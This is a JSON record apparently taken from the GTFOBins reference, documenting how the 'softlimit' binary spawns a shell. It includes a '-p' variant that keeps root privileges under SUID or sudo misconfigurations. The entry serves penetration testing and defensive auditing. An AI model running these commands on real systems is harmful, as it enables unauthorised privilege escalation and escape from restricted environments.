{"title": "softlimit", "source": "gtfobins", "source_label": "GTFOBins", "path": "softlimit", "html": "<h1>softlimit</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">softlimit /bin/sh</code></pre>\n<p><strong>SUID override:</strong></p>\n<pre><code class=\"language-bash\">softlimit /bin/sh -p</code></pre>", "excerpt": "softlimit Shell softlimit /bin/sh SUID override: softlimit /bin/sh -p", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}